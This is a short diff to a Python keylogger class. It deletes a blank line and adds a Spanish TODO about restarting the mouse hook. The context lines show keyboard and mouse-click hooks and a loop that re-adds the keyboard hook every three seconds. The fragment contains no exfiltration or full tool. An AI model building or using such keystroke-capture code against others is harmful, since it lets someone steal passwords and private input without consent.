@@ -263,7 +263,6 @@ class Keylogger:
         """
         keyboard.hook(self.callback)
 
-
         mouse.on_click(self.callback_mouse, ('left',))
         mouse.on_right_click(self.callback_mouse, ('right',))
         mouse.on_middle_click(self.callback_mouse, ('middle',))
@@ -295,6 +294,8 @@ class Keylogger:
 
                 # Añado de nuevo el hook para leer teclado
                 keyboard.hook(self.callback)
+
+                # TODO → Reiniciar MOUSE
 
             # Pausa entre cada comprobación.
             sleep(3)
